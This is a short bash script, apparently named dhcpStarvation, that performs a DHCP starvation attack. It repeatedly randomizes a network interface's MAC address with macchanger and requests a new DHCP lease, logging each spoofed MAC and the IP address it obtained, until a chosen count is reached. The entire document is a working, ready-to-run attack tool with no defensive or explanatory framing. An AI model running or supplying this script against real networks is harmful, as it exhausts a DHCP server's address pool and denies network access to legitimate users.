#
#Use this script with macchanger installed
#
#!/bin/bash

if [ -z "$2" ]
  then
    echo "Usage: ./dhcpStarvation eth0 10"
    exit 1
fi

echo "No	MAC Address		IP Address"
echo "...	.................	........................"
for ((i=0;i<$2;i++))
do
mac=$(macchanger -r $1|grep New|cut -d" " -f 9)
dhclient $1
ip=$(ifconfig $1 | grep inet | grep -v inet6|cut -d" " -f10)
echo $i" 	"$mac"	"$ip
done
